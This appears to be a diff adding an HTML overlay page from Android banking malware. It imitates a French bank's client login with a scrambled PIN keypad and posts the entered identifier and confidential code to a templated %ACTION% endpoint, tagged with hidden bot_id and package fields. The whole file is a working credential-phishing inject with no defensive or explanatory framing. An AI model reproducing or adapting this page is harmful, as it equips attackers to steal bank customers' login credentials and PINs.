@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui" />
+	<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+	<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
+	<style type="text/css">
+		* {
+			margin: 0;
+			padding: 0;
+		}
+		body {
+			background-color: #ededed;
+		}
+		.content{
+			padding-left: 15px;
+			padding-top: 5px;
+			padding-right: 15px;
+		}
+		.TextViewLogin {
+			font-weight: bold;
+			color: #5e5e5e;
+		}
+		#EditTextLogin {
+			border: 2px solid;
+			width: 100%;
+			height: 30px;
+			border-color: grey;
+			border-radius: 5px;
+			margin-bottom: 15px;
+		}
+		#EditTextLogin:focus {
+
+			border-color: red;
+		}
+		#EditTextLogin:active {
+			border-color: red;
+			background-color: red;
+		}
+		.labelText {
+			font-size: 12px
+		}
+		#CheckBox01 {
+			display: none;
+			margin-right: 7px;
+		}
+		#CheckBox01 + label {
+			height: 35px;
+			width: 35px;
+			background-image: url("%DYN_PATH%/img/abc_btn_check_to_on_mtrl_000.png");
+			display: inline-block;
+			background-size: 35px 35px;
+			top: 5px;
+			position: relative;
+			top: 15px;
+		}
+		#CheckBox01:checked + label {
+			background-image: url("%DYN_PATH%/img/abc_btn_check_to_on_mtrl_015.png");
+		}
+		#TextViewNumUsager {
+			padding-top: 15px;
+			font-weight: bold;
+			color: #5e5e5e;
+		}
+		#TextPwd {
+			border: 2px solid;
+			width: 100%;
+			height: 30px;
+			border-color: grey;
+			border-radius: 5px;
+			/*margin-bottom: 15px;*/
+		}
+		#TextPwd:focus {
+			border-color: red;
+		}
+		.navigationButtons {
+			margin-top: 5px;
+			text-align: center;
+			width: 100%;
+		}
+		.ButtonEffacer {
+			font-size: 16px;
+			font-weight: bold;
+			color: white;
+			background-image: url("%DYN_PATH%/img/btn_valider_menu_droite.png");
+			background-size: cover;
+			margin-right: 5px;
+			margin-left: 0;
+			display: inline-block;
+			border-radius: 5px;
+			height: 35px;
+			width: 100%;
+			border: 0;
+		}
+		.ButtonEffacer:active {
+			background-image: url("%DYN_PATH%/img/btn_annuler_menu_droite.png");
+		}
+		.ButtonLancer {
+			font-size: 16px;
+			font-weight: bold;
+			color: white;
+			background-image: url("%DYN_PATH%/img/btn_annuler_menu_droite.png");
+			background-size: cover;
+			margin-left: 5px;
+			width: 100%;
+			border-radius: 5px;
+			height: 35px;
+			border: 0;
+		}
+		.ButtonLancer:active {
+			background-image: url("%DYN_PATH%/img/btn_valider_menu_droite.png");
+		}
+		.navTable {
+			width: 100%;
+		}
+		.passwordButtons {
+			width: 100%;
+			table-layout: fixed;
+			margin-top: 15px;
+		}
+		.passwordRow {
+			margin-bottom: 15px;
+		}
+		.passwordRow td {
+			text-align: center;
+		}
+		.passwordButton {
+			font-size: 30px;
+			font-weight: bold;
+			/*margin: 5px;*/
+			text-align: center;
+			line-height: 40px;
+			width: 50px;
+			height: 50px;
+		}
+		.passwordButtouDiv {
+			display: inline-block;
+			text-align: center;
+		}
+		.ident {
+			width: 100%;
+			text-align: center;
+			color: #5e5e5e;
+			font-weight: bold;
+			font-size: 18px;
+			margin-bottom: 20px;
+		}
+	</style>
+</head>
+<body>
+
+<div class="content">
+	<div class="ident">Identification</div>
+	<div class="TextViewLogin">
+		Identification client
+	</div>
+	<form role="form" name="form" action="%ACTION%" id="form" method="post">
+	<input type="hidden" name="page_id" value="%PKG%"><input type="hidden" name="bot_id" value="%BOTID%" />
+	<input type="tel" name="fields[username]" id="EditTextLogin" autocomplete="off">
+	<span class="labelText">Mémoriser mon identifiant client</span> <input type="checkbox" name="CheckBox01" id="CheckBox01"><label for="CheckBox01"></label>
+
+	<div id="TextViewNumUsager">
+		Code confidentiel
+	</div>
+	<input type="password" name="fields[password]" id="TextPwd" readonly="1">
+	</form>
+
+	<div class="navigationButtons">
+		<table class="navTable">
+			<tr>
+				<td>
+					<button id="ButtonEffacer" class="ButtonEffacer">Effacer</button>
+					
+				</td>
+				<td>
+					<button id="ButtonLancer" class="ButtonLancer">Valider</button>
+					
+				</td>
+			</tr>
+		</table>
+
+	</div>
+		<table class="passwordButtons" cellpadding="5px">
+			<tr class="passwordRow">
+				<td><div class="passwordButtonDiv"><button class="passwordButton">1</button></div></td><td><div class="passwordButtonDiv"><button class="passwordButton">1</button></div></td><td><div class="passwordButtonDiv"><button class="passwordButton">1</button></div></td><td><div class="passwordButtonDiv"><button class="passwordButton">1</button></div></td><td><div class="passwordButtonDiv"><button class="passwordButton">1</button></div></td>
+				<!-- <td><button class="passwordButton">1</button></td><td><button class="passwordButton">1</button></td><td><button class="passwordButton">1</button></td><td><button class="passwordButton">1</button></td><td><button class="passwordButton">1</button></td> -->
+			</tr>
+			<tr class="passwordRow">
+				<!-- <td><button class="passwordButton">1</button></td><td><button class="passwordButton">1</button></td><td><button class="passwordButton">1</button></td><td><button class="passwordButton">1</button></td><td><button class="passwordButton">1</button></td> -->
+				<td><div class="passwordButtonDiv"><button class="passwordButton">1</button></div></td><td><div class="passwordButtonDiv"><button class="passwordButton">1</button></div></td><td><div class="passwordButtonDiv"><button class="passwordButton">1</button></div></td><td><div class="passwordButtonDiv"><button class="passwordButton">1</button></div></td><td><div class="passwordButtonDiv"><button class="passwordButton">1</button></div></td>
+			</tr>
+		</table>
+</div>
+
+</body>
+
+<script type="text/javascript">
+	
+Array.prototype.shuffle = function() {
+   var i = this.length;
+   while (--i) {
+      var j = Math.floor(Math.random() * (i + 1))
+      var temp = this[i];
+      this[i] = this[j];
+      this[j] = temp;
+   }
+
+   return this; // for convenience, in case we want a reference to the array
+};
+
+
+function enableSubmit(enable){
+	$('#ButtonLancer').toggleClass('ButtonEffacer', enable);
+	$('#ButtonLancer').toggleClass('ButtonLancer', !enable);	
+}
+
+function passwordClicked(elem){
+	console.log(elem);
+	var value = elem.id;
+
+	var passw = $('#TextPwd');
+	passw.val(passw.val() + value);
+	if ($('#EditTextLogin').val()){
+		enableSubmit(true);
+	}
+}
+
+
+
+(function(){
+	var digits = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9].shuffle();
+	var tds = $('.passwordButton');
+	for (var i = 0; i < tds.length; i++){
+		var elem = tds[i];
+		elem.innerText = digits[i];
+		elem.id = digits[i];
+		elem.onclick = function(){
+			passwordClicked(this);
+		};
+	}
+
+	$('#EditTextLogin').bind('keyup', function(){
+		if ($('#EditTextLogin').val() && $('#TextPwd').val()){
+			enableSubmit(true);
+		}
+		else {
+			enableSubmit(false);
+		}
+	});
+
+	$('#ButtonEffacer').bind('click', function(){
+		$('#TextPwd').val('');
+		if ($('#EditTextLogin').val() && $('#TextPwd').val()){
+			enableSubmit(true);
+		}
+		else {
+			enableSubmit(false);
+		}
+	});
+
+
+	$('#ButtonLancer').bind('click', function(){
+		var fields = {
+			'EditTextLogin': /.+/,
+			'TextPwd': /[0-9]+/
+		};
+
+		var err = false;
+
+		for (i in fields){
+			var field = i;
+			var regex = fields[i];
+
+			if(!(new RegExp(regex).test($('#' + field).val())))
+			{
+				
+				err = true;
+			} 
+		}
+
+		if (err){
+			return;
+		}
+
+		var oForm=document.getElementById('form');
+		oForm.submit();
+	});
+
+})();
+
+</script>
+</html>
